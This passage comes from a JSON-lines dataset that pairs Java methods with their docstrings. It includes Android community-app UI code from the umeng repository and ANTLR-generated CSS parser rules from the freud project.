true);\n        }\n    });\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u521d\u59cb\u5316\u6807\u9898\u680f\u76f8\u5173\u63a7\u4ef6\u8ddf\u8bbe\u7f6e\u6570\u636e</br>\n */\n", "func_signal": "private void initTitle()", "code": "{\n    findViewById(ResFinder.getId(\"umeng_comm_title_back_btn\")).setOnClickListener(this);\n    TextView titleTextView = (TextView) findViewById(ResFinder.getId(\"umeng_comm_title_tv\"));\n    titleTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);\n    titleTextView.setText(mTopic.name);\n    findViewById(ResFinder.getId(\"umeng_comm_title_setting_btn\")).setVisibility(View.GONE);\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\activities\\TopicDetailActivity.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u4e3b\u52a8\u8c03\u7528\u52a0\u8f7d\u6570\u636e\u3002 \u3010\u6ce8\u610f\u3011\u8be5\u63a5\u53e3\u4ec5\u4ec5\u5728\u9000\u51fa\u767b\u5f55\u65f6\uff0c\u8df3\u8f6c\u5230FeedsActivity\u6e05\u7406\u6570\u636e\u540e\u91cd\u65b0\u5237\u65b0\u6570\u636e</br>\n */\n", "func_signal": "public void repeatLoadDataFromServer()", "code": "{\n    if (mMainFeedFragment != null) {\n        mMainFeedFragment.loadFeedFromServer();\n    }\n    if (mRecommendFragment != null) {\n        mRecommendFragment.loadDataFromServer();\n    }\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u8df3\u8f6c\u5230\u53d1\u73b0Activity</br>\n * \n * @param user\n */\n", "func_signal": "public void gotoFindActivity(CommUser user)", "code": "{\n    Intent intent = new Intent(getActivity(), FindActivity.class);\n    if (user == null) {// \u6765\u81ea\u5f00\u53d1\u8005\u5916\u90e8\u8c03\u7528\u7684\u60c5\u51b5\n        intent.putExtra(Constants.TAG_USER, CommConfig.getConfig().loginedUser);\n    } else {\n        intent.putExtra(Constants.TAG_USER, user);\n    }\n    intent.putExtra(Constants.TYPE_CLASS, mContainerClass);\n    getActivity().startActivity(intent);\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u9690\u85cfMianFeedFragment\u7684\u8f93\u5165\u6cd5\uff0c\u5f53\u9000\u51fafragment or activity\u7684\u65f6\u5019</br>\n */\n", "func_signal": "public void hideCommentLayoutAndInputMethod()", "code": "{\n    if (mMainFeedFragment != null) {\n        mMainFeedFragment.hideCommentLayoutAndInputMethod();\n    }\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u6784\u5efafeed\u6570\u91cf\u3001\u7c89\u4e1d\u6570\u91cf\u7684\u5b57\u7b26\u4e32\n * \n * @param topic\n * @return\n */\n", "func_signal": "protected String buildMsgFansStr(Topic topic)", "code": "{\n    StringBuilder builder = new StringBuilder(mFeedsStr);\n    builder.append(topic.feedCount);\n    builder.append(DIVIDER).append(mFansStr);\n    builder.append(topic.fansCount);\n    return builder.toString();\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\adapters\\RecommendTopicAdapter.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u83b7\u53d6\u5bf9\u5e94\u7684Fragment\u30020\uff1a\u8bdd\u9898\u805a\u5408 1\uff1a\u6d3b\u8dc3\u7528\u6237</br>\n * \n * @param pos\n * @return\n */\n", "func_signal": "private Fragment getFragment(int pos)", "code": "{\n    if (pos == 0) {\n        if (mDetailFragment == null) {\n            mDetailFragment = TopicFeedFragment.newTopicFeedFrmg(mTopic);\n        }\n        mDetailFragment.setOnAnimationListener(mListener);\n        return mDetailFragment;\n    } else if (pos == 1) {\n        if (mActiveUserFragment == null) {\n            mActiveUserFragment = ActiveUserFragment.newActiveUserFragment(mTopic);\n            mActiveUserFragment.setOnAnimationListener(mListener);\n        }\n        return mActiveUserFragment;\n    }\n    return null;\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\activities\\TopicDetailActivity.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u6ce8\u518c\u767b\u5f55\u6210\u529f\u65f6\u7684\u5e7f\u64ad</br>\n */\n", "func_signal": "private void registerInitSuccessBroadcast()", "code": "{\n    IntentFilter filter = new IntentFilter();\n    filter.addAction(Constants.ACTION_INIT_SUCCESS);\n    LocalBroadcastManager.getInstance(getActivity()).registerReceiver(mInitConfigReceiver,\n            filter);\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u8bbe\u7f6e\u56de\u9000\u6309\u94ae\u7684\u53ef\u89c1\u6027\n * \n * @param visible\n */\n", "func_signal": "public void setBackButtonVisibility(int visible)", "code": "{\n    if (visible == View.VISIBLE || visible == View.INVISIBLE || visible == View.GONE) {\n        this.mBackButtonVisible = visible;\n    }\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\fragments\\CommunityMainFragment.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "// init set\n", "func_signal": "private void init()", "code": "{\n    setColumnWidth(DeviceUtils.dp2px(getContext(), COLUMN_WIDTH));\n    int color = Color.parseColor(\"#f4f4f6\");\n    setCacheColorHint(color);\n    setDrawingCacheBackgroundColor(color);\n    setBackgroundColor(color);\n    setNumColumns(COLUMNS);\n    setSelector(new ColorDrawable(color));\n    setVerticalSpacing(DeviceUtils.dp2px(getContext(), 10));\n    setFadingEdgeLength(0);\n\n    EmojiAdapter adapter = new EmojiAdapter(getContext(), mEmojicons);\n    setAdapter(adapter);\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\emoji\\EmojiView.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u63a8\u8350\u8bdd\u9898\u7684\u663e\u793a\u6837\u5f0f\u8ddf\u63a8\u8350\u7528\u6237\u7684\u6837\u5f0f\u76f8\u540c\n * \n * @param context\n * @param topics\n */\n", "func_signal": "public RecommendTopicAdapter(Context context)", "code": "{\n    super(context);\n    mTopicColor = ResFinder.getColor(\"umeng_comm_text_topic_light_color\");\n    mFeedsStr = ResFinder.getString(\"umeng_comm_feeds_num\");\n    mFansStr = ResFinder.getString(\"umeng_comm_fans_num\");\n    mTopicColor = ResFinder.getColor(\"umeng_comm_text_topic_light_color\");\n    mTopicIcon = ResFinder.getResourceId(ResType.DRAWABLE,\n            \"umeng_comm_topic_icon\");\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\adapters\\RecommendTopicAdapter.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * \u8df3\u8f6c\u5230\u8bdd\u9898\u8be6\u60c5\u9875\u9762</br>\n * \n * @param topic\n */\n", "func_signal": "private void gotoTopicDetailPage(Topic topic)", "code": "{\n    Intent intent = new Intent();\n    ComponentName componentName = new ComponentName(mContext, TopicDetailActivity.class);\n    intent.setComponent(componentName);\n    intent.putExtra(Constants.TAG_TOPIC, topic);\n    ((Activity) mContext).startActivity(intent);\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\adapters\\RecommendTopicAdapter.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "/**\n * set calback function</br>\n * \n * @param listener\n */\n", "func_signal": "public void setOnItemClickListener(final OnEmojiItemClickListener listener)", "code": "{\n    setOnItemClickListener(new OnItemClickListener() {\n\n        @Override\n        public void onItemClick(AdapterView<?> parent, View view, int position, long id) {\n            listener.onItemClick(mEmojicons[position]);\n        }\n    });\n}", "path": "umeng_comm_android_ui\\src\\com\\umeng\\comm\\ui\\emoji\\EmojiView.java", "repo_name": "umeng/umeng_community_android", "stars": 83, "license": "mit", "language": "java", "size": 7553}
{"docstring": "// $ANTLR start \"unit\"\n// /home/langera/dev/freud/src/grammar/Css.g:119:1: unit : ( '%' | 'px' | 'cm' | 'mm' | 'in' | 'pt' | 'pc' | 'em' | 'ex' | 'deg' | 'rad' | 'grad' | 'ms' | 's' | 'hz' | 'khz' ) ;\n", "func_signal": "public final CssParser.unit_return unit() throws RecognitionException", "code": "{\n    CssParser.unit_return retval = new CssParser.unit_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token set68 = null;\n\n    CommonTree set68_tree = null;\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:120:2: ( ( '%' | 'px' | 'cm' | 'mm' | 'in' | 'pt' | 'pc' | 'em' | 'ex' | 'deg' | 'rad' | 'grad' | 'ms' | 's' | 'hz' | 'khz' ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:120:4: ( '%' | 'px' | 'cm' | 'mm' | 'in' | 'pt' | 'pc' | 'em' | 'ex' | 'deg' | 'rad' | 'grad' | 'ms' | 's' | 'hz' | 'khz' )\n        {\n            root_0 = (CommonTree) adaptor.nil();\n\n            set68 = (Token) input.LT(1);\n            if ((input.LA(1) >= 45 && input.LA(1) <= 60)) {\n                input.consume();\n                adaptor.addChild(root_0, (CommonTree) adaptor.create(set68));\n                state.errorRecovery = false;\n            }\n            else {\n                MismatchedSetException mse = new MismatchedSetException(null, input);\n                throw mse;\n            }\n\n\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"selectop\"\n// /home/langera/dev/freud/src/grammar/Css.g:72:1: selectop : ( '>' -> CHILD | '+' -> ADJACENT_SIBLING );\n", "func_signal": "public final CssParser.selectop_return selectop() throws RecognitionException", "code": "{\n    CssParser.selectop_return retval = new CssParser.selectop_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal29 = null;\n    Token char_literal30 = null;\n\n    CommonTree char_literal29_tree = null;\n    CommonTree char_literal30_tree = null;\n    RewriteRuleTokenStream stream_32 = new RewriteRuleTokenStream(adaptor, \"token 32\");\n    RewriteRuleTokenStream stream_33 = new RewriteRuleTokenStream(adaptor, \"token 33\");\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:73:2: ( '>' -> CHILD | '+' -> ADJACENT_SIBLING )\n        int alt14 = 2;\n        int LA14_0 = input.LA(1);\n\n        if ((LA14_0 == 32)) {\n            alt14 = 1;\n        }\n        else if ((LA14_0 == 33)) {\n            alt14 = 2;\n        }\n        else {\n            NoViableAltException nvae =\n                    new NoViableAltException(\"\", 14, 0, input);\n\n            throw nvae;\n        }\n        switch (alt14) {\n            case 1:\n                // /home/langera/dev/freud/src/grammar/Css.g:73:4: '>'\n            {\n                char_literal29 = (Token) match(input, 32, FOLLOW_32_in_selectop363);\n                stream_32.add(char_literal29);\n\n\n                // AST REWRITE\n                // elements:\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 73:8: -> CHILD\n                {\n                    adaptor.addChild(root_0, (CommonTree) adaptor.create(CHILD, \"CHILD\"));\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 2:\n                // /home/langera/dev/freud/src/grammar/Css.g:74:11: '+'\n            {\n                char_literal30 = (Token) match(input, 33, FOLLOW_33_in_selectop379);\n                stream_33.add(char_literal30);\n\n\n                // AST REWRITE\n                // elements:\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 74:16: -> ADJACENT_SIBLING\n                {\n                    adaptor.addChild(root_0, (CommonTree) adaptor.create(ADJACENT_SIBLING, \"ADJACENT_SIBLING\"));\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n\n        }\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"stylesheet\"\n// /home/langera/dev/freud/src/grammar/Css.g:40:1: stylesheet : ( importRule )* ( nested | ruleset )+ ;\n", "func_signal": "public final CssParser.stylesheet_return stylesheet() throws RecognitionException", "code": "{\n    CssParser.stylesheet_return retval = new CssParser.stylesheet_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    CssParser.importRule_return importRule1 = null;\n\n    CssParser.nested_return nested2 = null;\n\n    CssParser.ruleset_return ruleset3 = null;\n\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:41:2: ( ( importRule )* ( nested | ruleset )+ )\n        // /home/langera/dev/freud/src/grammar/Css.g:41:4: ( importRule )* ( nested | ruleset )+\n        {\n            root_0 = (CommonTree) adaptor.nil();\n\n            // /home/langera/dev/freud/src/grammar/Css.g:41:4: ( importRule )*\n            loop1:\n            do {\n                int alt1 = 2;\n                int LA1_0 = input.LA(1);\n\n                if (((LA1_0 >= 26 && LA1_0 <= 27))) {\n                    alt1 = 1;\n                }\n\n\n                switch (alt1) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:41:4: importRule\n                    {\n                        pushFollow(FOLLOW_importRule_in_stylesheet131);\n                        importRule1 = importRule();\n\n                        state._fsp--;\n\n                        adaptor.addChild(root_0, importRule1.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop1;\n                }\n            }\n            while (true);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:41:16: ( nested | ruleset )+\n            int cnt2 = 0;\n            loop2:\n            do {\n                int alt2 = 3;\n                int LA2_0 = input.LA(1);\n\n                if ((LA2_0 == 28)) {\n                    alt2 = 1;\n                }\n                else if ((LA2_0 == IDENT || (LA2_0 >= 35 && LA2_0 <= 37))) {\n                    alt2 = 2;\n                }\n\n\n                switch (alt2) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:41:17: nested\n                    {\n                        pushFollow(FOLLOW_nested_in_stylesheet135);\n                        nested2 = nested();\n\n                        state._fsp--;\n\n                        adaptor.addChild(root_0, nested2.getTree());\n\n                    }\n                    break;\n                    case 2:\n                        // /home/langera/dev/freud/src/grammar/Css.g:41:26: ruleset\n                    {\n                        pushFollow(FOLLOW_ruleset_in_stylesheet139);\n                        ruleset3 = ruleset();\n\n                        state._fsp--;\n\n                        adaptor.addChild(root_0, ruleset3.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        if (cnt2 >= 1) {\n                            break loop2;\n                        }\n                        EarlyExitException eee =\n                                new EarlyExitException(2, input);\n                        throw eee;\n                }\n                cnt2++;\n            }\n            while (true);\n\n\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"selector\"\n// /home/langera/dev/freud/src/grammar/Css.g:64:1: selector : elem ( selectorOperation )* ( attrib )* ( pseudo )? -> elem ( selectorOperation )* ( attrib )* ( pseudo )* ;\n", "func_signal": "public final CssParser.selector_return selector() throws RecognitionException", "code": "{\n    CssParser.selector_return retval = new CssParser.selector_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    CssParser.elem_return elem23 = null;\n\n    CssParser.selectorOperation_return selectorOperation24 = null;\n\n    CssParser.attrib_return attrib25 = null;\n\n    CssParser.pseudo_return pseudo26 = null;\n\n\n    RewriteRuleSubtreeStream stream_elem = new RewriteRuleSubtreeStream(adaptor, \"rule elem\");\n    RewriteRuleSubtreeStream stream_pseudo = new RewriteRuleSubtreeStream(adaptor, \"rule pseudo\");\n    RewriteRuleSubtreeStream stream_selectorOperation = new RewriteRuleSubtreeStream(adaptor, \"rule selectorOperation\");\n    RewriteRuleSubtreeStream stream_attrib = new RewriteRuleSubtreeStream(adaptor, \"rule attrib\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:65:2: ( elem ( selectorOperation )* ( attrib )* ( pseudo )? -> elem ( selectorOperation )* ( attrib )* ( pseudo )* )\n        // /home/langera/dev/freud/src/grammar/Css.g:65:4: elem ( selectorOperation )* ( attrib )* ( pseudo )?\n        {\n            pushFollow(FOLLOW_elem_in_selector308);\n            elem23 = elem();\n\n            state._fsp--;\n\n            stream_elem.add(elem23.getTree());\n            // /home/langera/dev/freud/src/grammar/Css.g:65:9: ( selectorOperation )*\n            loop10:\n            do {\n                int alt10 = 2;\n                alt10 = dfa10.predict(input);\n                switch (alt10) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:65:9: selectorOperation\n                    {\n                        pushFollow(FOLLOW_selectorOperation_in_selector310);\n                        selectorOperation24 = selectorOperation();\n\n                        state._fsp--;\n\n                        stream_selectorOperation.add(selectorOperation24.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop10;\n                }\n            }\n            while (true);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:65:28: ( attrib )*\n            loop11:\n            do {\n                int alt11 = 2;\n                int LA11_0 = input.LA(1);\n\n                if ((LA11_0 == 40)) {\n                    alt11 = 1;\n                }\n\n\n                switch (alt11) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:65:28: attrib\n                    {\n                        pushFollow(FOLLOW_attrib_in_selector313);\n                        attrib25 = attrib();\n\n                        state._fsp--;\n\n                        stream_attrib.add(attrib25.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop11;\n                }\n            }\n            while (true);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:65:36: ( pseudo )?\n            int alt12 = 2;\n            int LA12_0 = input.LA(1);\n\n            if (((LA12_0 >= 38 && LA12_0 <= 39))) {\n                alt12 = 1;\n            }\n            switch (alt12) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:65:36: pseudo\n                {\n                    pushFollow(FOLLOW_pseudo_in_selector316);\n                    pseudo26 = pseudo();\n\n                    state._fsp--;\n\n                    stream_pseudo.add(pseudo26.getTree());\n\n                }\n                break;\n\n            }\n\n\n            // AST REWRITE\n            // elements: elem, pseudo, attrib, selectorOperation\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 65:44: -> elem ( selectorOperation )* ( attrib )* ( pseudo )*\n            {\n                adaptor.addChild(root_0, stream_elem.nextTree());\n                // /home/langera/dev/freud/src/grammar/Css.g:65:53: ( selectorOperation )*\n                while (stream_selectorOperation.hasNext()) {\n                    adaptor.addChild(root_0, stream_selectorOperation.nextTree());\n\n                }\n                stream_selectorOperation.reset();\n                // /home/langera/dev/freud/src/grammar/Css.g:65:72: ( attrib )*\n                while (stream_attrib.hasNext()) {\n                    adaptor.addChild(root_0, stream_attrib.nextTree());\n\n                }\n                stream_attrib.reset();\n                // /home/langera/dev/freud/src/grammar/Css.g:65:80: ( pseudo )*\n                while (stream_pseudo.hasNext()) {\n                    adaptor.addChild(root_0, stream_pseudo.nextTree());\n\n                }\n                stream_pseudo.reset();\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"selectors\"\n// /home/langera/dev/freud/src/grammar/Css.g:60:1: selectors : selector ( ',' selector )* ;\n", "func_signal": "public final CssParser.selectors_return selectors() throws RecognitionException", "code": "{\n    CssParser.selectors_return retval = new CssParser.selectors_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal21 = null;\n    CssParser.selector_return selector20 = null;\n\n    CssParser.selector_return selector22 = null;\n\n\n    CommonTree char_literal21_tree = null;\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:61:2: ( selector ( ',' selector )* )\n        // /home/langera/dev/freud/src/grammar/Css.g:61:4: selector ( ',' selector )*\n        {\n            root_0 = (CommonTree) adaptor.nil();\n\n            pushFollow(FOLLOW_selector_in_selectors289);\n            selector20 = selector();\n\n            state._fsp--;\n\n            adaptor.addChild(root_0, selector20.getTree());\n            // /home/langera/dev/freud/src/grammar/Css.g:61:13: ( ',' selector )*\n            loop9:\n            do {\n                int alt9 = 2;\n                int LA9_0 = input.LA(1);\n\n                if ((LA9_0 == 31)) {\n                    alt9 = 1;\n                }\n\n\n                switch (alt9) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:61:14: ',' selector\n                    {\n                        char_literal21 = (Token) match(input, 31, FOLLOW_31_in_selectors292);\n                        char_literal21_tree = (CommonTree) adaptor.create(char_literal21);\n                        adaptor.addChild(root_0, char_literal21_tree);\n\n                        pushFollow(FOLLOW_selector_in_selectors294);\n                        selector22 = selector();\n\n                        state._fsp--;\n\n                        adaptor.addChild(root_0, selector22.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop9;\n                }\n            }\n            while (true);\n\n\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"declaration\"\n// /home/langera/dev/freud/src/grammar/Css.g:103:1: declaration : IDENT ':' args -> ^( PROPERTY IDENT args ) ;\n", "func_signal": "public final CssParser.declaration_return declaration() throws RecognitionException", "code": "{\n    CssParser.declaration_return retval = new CssParser.declaration_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token IDENT54 = null;\n    Token char_literal55 = null;\n    CssParser.args_return args56 = null;\n\n\n    CommonTree IDENT54_tree = null;\n    CommonTree char_literal55_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_38 = new RewriteRuleTokenStream(adaptor, \"token 38\");\n    RewriteRuleSubtreeStream stream_args = new RewriteRuleSubtreeStream(adaptor, \"rule args\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:104:2: ( IDENT ':' args -> ^( PROPERTY IDENT args ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:104:4: IDENT ':' args\n        {\n            IDENT54 = (Token) match(input, IDENT, FOLLOW_IDENT_in_declaration618);\n            stream_IDENT.add(IDENT54);\n\n            char_literal55 = (Token) match(input, 38, FOLLOW_38_in_declaration620);\n            stream_38.add(char_literal55);\n\n            pushFollow(FOLLOW_args_in_declaration622);\n            args56 = args();\n\n            state._fsp--;\n\n            stream_args.add(args56.getTree());\n\n\n            // AST REWRITE\n            // elements: IDENT, args\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 104:19: -> ^( PROPERTY IDENT args )\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:104:22: ^( PROPERTY IDENT args )\n                {\n                    CommonTree root_1 = (CommonTree) adaptor.nil();\n                    root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(PROPERTY, \"PROPERTY\"), root_1);\n\n                    adaptor.addChild(root_1, stream_IDENT.nextNode());\n                    adaptor.addChild(root_1, stream_args.nextTree());\n\n                    adaptor.addChild(root_0, root_1);\n                }\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"nested\"\n// /home/langera/dev/freud/src/grammar/Css.g:48:1: nested : '@' nest '{' ( properties )? ( nested )* '}' -> ^( NESTED nest ( properties )* ( nested )* ) ;\n", "func_signal": "public final CssParser.nested_return nested() throws RecognitionException", "code": "{\n    CssParser.nested_return retval = new CssParser.nested_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal7 = null;\n    Token char_literal9 = null;\n    Token char_literal12 = null;\n    CssParser.nest_return nest8 = null;\n\n    CssParser.properties_return properties10 = null;\n\n    CssParser.nested_return nested11 = null;\n\n\n    CommonTree char_literal7_tree = null;\n    CommonTree char_literal9_tree = null;\n    CommonTree char_literal12_tree = null;\n    RewriteRuleTokenStream stream_30 = new RewriteRuleTokenStream(adaptor, \"token 30\");\n    RewriteRuleTokenStream stream_28 = new RewriteRuleTokenStream(adaptor, \"token 28\");\n    RewriteRuleTokenStream stream_29 = new RewriteRuleTokenStream(adaptor, \"token 29\");\n    RewriteRuleSubtreeStream stream_nested = new RewriteRuleSubtreeStream(adaptor, \"rule nested\");\n    RewriteRuleSubtreeStream stream_nest = new RewriteRuleSubtreeStream(adaptor, \"rule nest\");\n    RewriteRuleSubtreeStream stream_properties = new RewriteRuleSubtreeStream(adaptor, \"rule properties\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:49:3: ( '@' nest '{' ( properties )? ( nested )* '}' -> ^( NESTED nest ( properties )* ( nested )* ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:49:5: '@' nest '{' ( properties )? ( nested )* '}'\n        {\n            char_literal7 = (Token) match(input, 28, FOLLOW_28_in_nested183);\n            stream_28.add(char_literal7);\n\n            pushFollow(FOLLOW_nest_in_nested185);\n            nest8 = nest();\n\n            state._fsp--;\n\n            stream_nest.add(nest8.getTree());\n            char_literal9 = (Token) match(input, 29, FOLLOW_29_in_nested187);\n            stream_29.add(char_literal9);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:49:18: ( properties )?\n            int alt4 = 2;\n            int LA4_0 = input.LA(1);\n\n            if ((LA4_0 == IDENT)) {\n                alt4 = 